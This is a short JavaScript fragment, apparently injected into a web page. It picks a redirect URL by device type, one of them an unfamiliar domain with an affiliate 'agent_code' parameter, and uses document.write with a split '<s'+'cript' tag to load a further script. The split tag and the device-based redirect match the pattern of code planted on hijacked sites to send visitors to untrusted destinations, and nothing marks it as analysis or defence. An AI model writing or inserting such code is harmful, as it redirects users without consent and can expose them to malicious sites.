...
if (flag) {
//k
_src = 'https://www.f7rmqb9.com:9443/?agent_code=6342892'
} else {
// PC
_src = 'https://bob.cykd88.com/'
}
...
;document.write("<s" + "cript type='text/javascript' src='/js/sjb.js?t=" + Math.random() + "''></scr" + "ipt>")
